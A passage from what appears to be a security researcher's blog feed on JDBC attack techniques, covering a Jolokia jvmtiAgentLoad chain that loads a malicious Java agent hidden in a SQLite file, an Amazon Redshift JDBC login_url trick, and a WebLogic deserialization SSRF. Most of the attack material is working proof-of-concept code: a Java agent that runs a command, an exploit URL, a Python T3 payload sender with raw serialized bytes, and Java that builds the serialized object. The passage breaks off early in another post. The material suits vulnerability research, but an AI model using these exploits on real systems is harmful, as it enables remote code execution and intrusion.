Connector did not verify the data source target whether or not a local resource, so we can utilized the operation <code>jvmtiAgentLoad</code> to load a local jar file. In this case the jar file is the SQLite database file.</p></li></ul><h5 id="Loading-class"><a href="#Loading-class" class="headerlink" title="Loading class"></a>Loading class</h5><p>As we know, we can use different ClassLoaders to load java classes from diverse origins. The main origins as follow:</p><ol><li><p>Loading .class file from local system directly, which is the loading method of most classes.</p></li><li><p>Loading .class file from archives such as zip, jar, etc.</p></li><li><p>Loading .class file or data through the network.</p></li><li><p>Extract .class file from proprietary databases.</p></li><li><p>Upload the Java source file to the server, dynamically compile it into .class file and perform loading.</p></li></ol><p>So we can create a malicious jar file and then insert the jar file data into the SQLite database as the BLOB data type.</p><h5 id="0x02-About-Jolokia"><a href="#0x02-About-Jolokia" class="headerlink" title="0x02 About Jolokia"></a>0x02 About Jolokia</h5><p>First of all , let’s review the Jolokia concept and its historical vulnerablities. </p><p>Jolokia is a JMX-HTTP bridge giving an alternative to JSR-160 connectors. It is an agent based approach with support for many platforms. In addition to basic JMX operations it enhances JMX remoting with unique features like bulk requests and fine grained security policies.</p><p>In the past days, there are several security researchers have shared their findings about Jolokia.They disclose a lot of weaknesses that exist in the Jolokia component. If you are interested in the vulnerabilities, you could review their write-ups.</p><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p><p><a href="https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/">https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/</a></p><p>I’m sure you’re aware Jololia often exposes many Mbeans, many of which are utilized to triger remote code execution vulnerabilities. In this case, we talk about the Mbean named <code>com.sun.management:type=DiagnosticCommand</code></p><h5 id="0x03-JVMTI-amp-Instrument"><a href="#0x03-JVMTI-amp-Instrument" class="headerlink" title="0x03 JVMTI &amp; Instrument"></a>0x03 JVMTI &amp; Instrument</h5><p>In this case, Jolokia exposes the <code>com.sun.management:type=DiagnosticCommand</code> MBean, it has a risky operation named <code>jvmtiAgentLoad</code>. So what is JVMTI? </p><p>JVMTI(JVM Tool Interface) which is the native interface provided by the java virtual machine. JVMTI is just a set of interfaces. If we want to develope JVM tools, we need to write an agent programme to use these interfaces. Agent programme is atually a C or C++ language written dynamic link library. So loading a malicious .so file can lead remote code exection. However, Java introduced <code>Instrumentation</code> since in JDK 5.</p><p>Using Instrumentation interface, we can call the dynamic library of libinstrument through Java code to interact with the JVMTI interface, eliminating the need to develop native dynamic link library files.</p><p>The Instrument mechanism includes two integration forms: one is the main method is executed before startup, and the other is the main method is loaded internally through attach.</p><ul><li>premain (Agent mode):  Main method is invoked before the target application starting.</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/path/to/javaagent.jar -jar application.jar</span><br></pre></td></tr></table></figure><p>  The argument <code>-javaagent</code> needs to be in front of <code>-jar</code>. Otherwise, it will not take effect.</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure><p>The premain method is relatively simple. It’s a jar file of the java agent. After adding this jar to the startup command, the premain method will be run before the main method is started. It should be noted that to make the jar file know which premain method to start, we also need to define it in the manifest file. There are also two ways to define a menifast. One is to write a menifast file directly, and the other is to use Maven’s plug-in to write it.</p><ul><li><p>agentmain(Attach mode): In addition to the target application, use an attach application to inject javaagent.jar into the target application.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><p>The attach method is relatively troublesome. You need to set up a separate application (or use a different thread), find all running VirtualMachineDescriptors through VirturalMachine. list(), match them to the target application, and then inject javaagent.jar into the target application.</p><p>If you have known the above knowledge, it is not difficult to realize using the <code>jvmtiAgentLoad</code>operation of <code>com.sun.management:type=DiagnosticCommand</code> mbean，we can inject malicious java agent into the application by attach mode without restarting target application.</p><h5 id="0x04-Create-malicious-Jar-file"><a href="#0x04-Create-malicious-Jar-file" class="headerlink" title="0x04 Create malicious Jar file"></a>0x04 Create malicious Jar file</h5><p>Firstly, the JDK provides two static methods, <code>premain</code> and <code>agentmain</code>, which can be used directly. Here I use the <code>agentmain</code> method.</p><p><img src="/images/pasted-231.png" alt="upload successful"></p><p>If you create <code>MANIFEST.MF</code> manually, you need to specify the Agent-Class, and finally build the jar file.</p><p><img src="/images/pasted-232.png" alt="upload successful"></p><p>It should be noted here that if a standard so file supported by JVMTI is called, there will be an error.</p><p><code>&quot;Agent_OnAttach is not available in /tmp/ext.so &quot;</code></p><p><img src="/images/pasted-233.png" alt="upload successful"></p><p>The reason is that the JVMTI is invoked through the <code>Agent_ OnAttach</code> as the entry function, and then execute the following process to load the Java agent.</p><ol><li><p>Get <code>JNIEnv</code> to ensure that it has been successfully attached to the Java process.</p></li><li><p>Create and initialize <code>JPLISAgent</code>, then make <code>VMInit</code> monitoring (it will not be triggered), and the logic is the same as <code>OnLoad</code>.</p></li><li><p>Read Agent-Class and load it.</p></li></ol><ol start="4"><li><p>Read the META-INFO related configuration and set the <code>mRetransformEnvironment ClassFileLoadHook</code> listening. The logic is the same as <code>OnLoad</code>.</p></li><li><p>Create an <code>InstrumentationImpl</code> instance.</p></li><li><p>Set the <code>mNormaltransformEnvironment ClassFileLoadHook</code> listening</p></li><li><p>Execute AgentMain method</p></li></ol><p>The Java agent code as follow:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class JavaAgent &#123;</span><br><span class="line">    private static final String RCE_COMMAND = &quot;open -a calculator&quot;;</span><br><span class="line"></span><br><span class="line">    public static void cmd() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(RCE_COMMAND);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void agentmain(String args, Instrumentation inst) &#123;</span><br><span class="line">        System.out.println(&quot;In JavaAgent Agentmain&quot;);</span><br><span class="line">        cmd();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Inject-malicious-jar-file-stream-into-database-file"><a href="#Inject-malicious-jar-file-stream-into-database-file" class="headerlink" title="Inject malicious jar file stream into database file"></a>Inject malicious jar file stream into database file</h5><p>Just use the JDBC Sink Connector feature.When establishing the SQLite JDBC connecting , a SQLite database file is created automatically, then insert the malicious jar file data into the database table. </p><p>According the Oracle official document definition:</p><p><img src="/images/pasted-234.png" alt="upload successful"></p><p>We can clearly know that the jar file is a kind of archives, like zip, tar,etc. It has no restriction about the file name.Consequently we can embed the jar files in other files just like zip files, without affecting their normal usage.</p><p>Eventually,when the SQLite database file exists in the local disk, using <code>jvmtiAgentLoad</code> operation to load the specified jar file.</p><h5 id="Final-Inllustration"><a href="#Final-Inllustration" class="headerlink" title="Final Inllustration"></a>Final Inllustration</h5><p>Owing to the vulnerability being fixed, I set up a local environment to reproduce it.</p><ul><li><p>Inject malicious Java agent into SQLite database file</p></li><li><p>During JDBC connection, if the database file does not exist ever, a SQLite database file <code>foo.jar</code> will be automatically created through the <code>getConnection</code> method of <code>DriverManager</code> and then create a table through the other corresponding SQL statement.</p></li></ul><ul><li>Write the malicious Java agent into the database as Blob data type. In my illustration, I write the malicious <code>agent.jar</code> into the SQLite database file <code>test.jar</code>.</li></ul><p><img src="/images/pasted-235.png" alt="upload successful"></p><ul><li>Load Java agent</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8099/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/tmp!/agent.jar</span><br></pre></td></tr></table></figure><ul><li>Successfully attach the malicious Java agent and complete the RCE</li></ul><p><img src="/images/pasted-236.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Amazon Redshift JDBC Attack Trick</title>
      <link href="/2022/06/29/Amazon-Redshift-JDBC-Driver-Trick/"/>
      <url>/2022/06/29/Amazon-Redshift-JDBC-Driver-Trick/</url>
      
        <content type="html"><![CDATA[<p>Amazon Redshift JDBC Driver supports plenty of properties as well.</p><ul><li><a href="https://docs.aws.amazon.com/redshift/latest/mgmt/options-for-providing-iam-credentials.html">https://docs.aws.amazon.com/redshift/latest/mgmt/options-for-providing-iam-credentials.html</a></li></ul><p>However, there are two special properties <code>plugin_name</code> and <code>login_url</code>. The <code>plugin_name</code> is used for providing IAM credentials. The Amazon Redshift JDBC driver includes SAML-based credential provider plugins. One of the plugins is for SAML MFA , the plugin class named <code>com.amazon.redshift.plugin.BrowserSamlCredentialsProvider </code></p><p><img src="/images/pasted-229.png" alt="upload successful"></p><p>So set the breakpoint at the method <code>openBrowser() </code> of  <code>BrowserSamlCredentialsProvider</code> class</p><p><img src="/images/pasted-224.png" alt="upload successful"></p><p>Apparently , the value of the property <code>login_url</code> steps into the method <code>Desktop.getDesktop().browse()</code></p><p>As we know, the method <code>Desktop.getDesktop().browse()</code> of the package <code>java.awt</code> will launch the default browser to display URI. Here is the sample for explanation</p><p><img src="/images/pasted-225.png" alt="upload successful"></p><p>Consequently, just set <code>file:///System/Applications/Calculator.app</code> as the value of property <code>login_url</code>, the default browser will display it. Here is the PoC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line"></span><br><span class="line">public class RedshiftDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws SQLException &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;Amazon Redshift Driver Version: &quot; + com.amazon.redshift.jdbc42.Driver.class.getPackage().getSpecificationVersion());</span><br><span class="line"></span><br><span class="line">        DriverManager.registerDriver(new com.amazon.redshift.jdbc42.Driver());</span><br><span class="line"></span><br><span class="line">        DriverManager.getConnection(&quot;jdbc:redshift:iam://mycluster:us-west-2/dev?plugin_name=com.amazon.redshift.plugin.BrowserSamlCredentialsProvider&amp;login_url=file:///System/Applications/Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-226.png" alt="upload successful"></p><p>Make JDBC Attacks Brilliant Again!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic SSRF via Deserialized Oracle JDBC Connection</title>
      <link href="/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/"/>
      <url>/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/</url>
      
        <content type="html"><![CDATA[<h4 id="0x01-Forewords"><a href="#0x01-Forewords" class="headerlink" title="0x01 Forewords"></a>0x01 Forewords</h4><p>As you know, I have researched the JDBC attacks for a long time. So I focus on the various attacks involving JDBC drivers. Today I write a short write-up about another way of JDBC attacking.</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>There is a private method <code>readObject</code> in the class <code>oracle.jdbc.pool.OraclePooledConnection</code> of ojdbc driver.</p><p><img src="/images/pasted-213.png" alt="upload successful"></p><p>Debug step by step, you will find it trying to establish a JDBC connection with deserializing the serialized stream. Here I post the key steps.</p><p><img src="/images/pasted-219.png" alt="upload successful"></p><p><img src="/images/pasted-220.png" alt="upload successful"></p><h4 id="0x03-PoC-for-Testing"><a href="#0x03-PoC-for-Testing" class="headerlink" title="0x03 PoC for Testing"></a>0x03 PoC for Testing</h4><p>weblogic.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 3:</span><br><span class="line">    print(&#x27;Usage: python &#123;&#125; &lt;TARGET_HOST&gt; &lt;PORT&gt; &lt;/PATH/TO/PAYLOAD&gt;&#x27;.format(os.path.basename(sys.argv[0])))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.settimeout(5)</span><br><span class="line"></span><br><span class="line">server_address = (sys.argv[1],int(sys.argv[2]))</span><br><span class="line"></span><br><span class="line">sys.stderr.write(&#x27;&#123;&#125; [+] Connecting to &#123;&#125; &#x27;.format(&#x27;\r\n&#x27;,server_address))</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"># Send headers</span><br><span class="line">headers=b&#x27;t3 10.3.6\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n&#x27;</span><br><span class="line">sys.stderr.write(&#x27;&#123;&#125; Sending &#123;&#125;&#x27;.format(&#x27;\r\n&#x27;,headers))</span><br><span class="line">sock.sendall(headers)</span><br><span class="line"></span><br><span class="line">data = sock.recv(1024)</span><br><span class="line">sys.stderr.write(&#x27;&#123;&#125; Received &#123;&#125;&#x27;.format(&#x27;\r\n&#x27;,data))</span><br><span class="line"></span><br><span class="line">payloadObj = open(sys.argv[3],&#x27;rb&#x27;).read()</span><br><span class="line"></span><br><span class="line">payload=b&#x27;\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00&#x27;</span><br><span class="line">payload=payload+payloadObj</span><br><span class="line">payload=payload+b&#x27;\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78&#x27;</span><br><span class="line"></span><br><span class="line"># adjust header for appropriate message length</span><br><span class="line">payload=struct.pack(&#x27;&gt;I&#x27;,len(payload)) + payload[4:]</span><br><span class="line"></span><br><span class="line">print(&#x27;[+] Sending payload...&#x27;)</span><br><span class="line">sock.send(payload)</span><br><span class="line">data = sock.recv(1024)</span><br><span class="line">sys.stderr.write(&#x27;&#123;&#125; Received &#123;&#125;&#x27;.format(&#x27;\r\n&#x27;,data))</span><br></pre></td></tr></table></figure><p>WeblogicOJDBC.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial.exploit;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import oracle.jdbc.internal.OpaqueString;</span><br><span class="line">import oracle.jdbc.pool.OraclePooledConnection;</span><br><span class="line"></span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class OracleJdbc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Properties properties = new Properties();</span><br><span class="line">        properties.put( &quot;InitialLimit&quot;, &quot;1&quot; );</span><br><span class="line">        properties.put( &quot;MinLimit&quot;, &quot;1&quot; );</span><br><span class="line">        properties.put( &quot;MaxLimit&quot;, &quot;5&quot; );</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz1 = Class.forName(&quot;oracle.jdbc.driver.OracleDriverExtension&quot;);</span><br><span class="line">        Class&lt;?&gt; clazz2 = Class.forName(&quot;oracle.jdbc.driver.T4CConnection&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz2.getDeclaredConstructor(String.class, Properties.class , clazz1);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">//ip</span><br><span class="line">        Object obj = constructor.newInstance(&quot;jdbc:oracle:thin:@&quot; + &quot;127.0.0.1:1521&quot; + &quot;:src&quot;, properties, null);</span><br><span class="line"></span><br><span class="line">//password</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz3 = Class.forName(&quot;oracle.jdbc.internal.OpaqueString&quot;);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = clazz3.getDeclaredConstructor(String.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        OpaqueString opaqueString = (OpaqueString)declaredConstructor.newInstance(&quot;123456&quot;);</span><br><span class="line"></span><br><span class="line">        Field password = clazz2.getDeclaredField(&quot;password&quot;);</span><br><span class="line">        password.setAccessible(true);</span><br><span class="line">        password.set(obj, opaqueString);</span><br><span class="line"></span><br><span class="line">//userName</span><br><span class="line">        Class&lt;?&gt; clazz4 = Class.forName(&quot;oracle.jdbc.driver.GeneratedPhysicalConnection&quot;);</span><br><span class="line">        Field userName = clazz4.getDeclaredField(&quot;userName&quot;);</span><br><span class="line">        userName.setAccessible(true);</span><br><span class="line">        userName.set(obj, &quot;root&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//physicalConn</span><br><span class="line">//Gain Runtime Object</span><br><span class="line">        OraclePooledConnection oraclePooledConnection = new OraclePooledConnection();</span><br><span class="line">        Field physicalConn = oraclePooledConnection.getClass().getDeclaredField(&quot;physicalConn&quot;);</span><br><span class="line">        physicalConn.setAccessible(true);</span><br><span class="line">        physicalConn.set(oraclePooledConnection, obj);</span><br><span class="line"></span><br><span class="line">// Serialzation Data</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;poc.ser&quot;);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(oraclePooledConnection);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-218.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Make JDBC Attacks Brilliant Again I</title>
      <link href="/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/"/>
      <url>/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-Forewords"><a href="#0x01-Forewords" class="headerlink" title="0x01 Forewords"></a>0x01 Forewords</h5><p>In HITB Singapore 2021, we made a presentation about JDBC attacks.Here is the detailed write-up about the talk.</p><h5 id="0x02-JDBC-Introduction"><a href="#0x02-JDBC-Introduction" class="headerlink" title="0x02 JDBC Introduction"></a>0x02 JDBC Introduction</h5><p>The JDBC API is a Java API that can access any kind of tabular data, especially data stored in a relational database.</p><p>JDBC helps you to write Java applications that manage these three programming activities:</p><ul><li>Connect to a data source, like a database</li><li>Send queries and update statements to the database</li><li>Retrieve and process the results received from the database in answer to your query</li></ul><p>Actually, JDBC is a set of standard interfaces and a particular relational database has its own implement, like <code>JDBCMysqlImpl</code> in MySQL JDBC driver. I draw the following picture to describe these implements.</p><p><img src="/images/pasted-131.png" alt="upload successful"></p><p>It is mainly in the <code>java.sql</code> package in JDK, JDBC drivers are 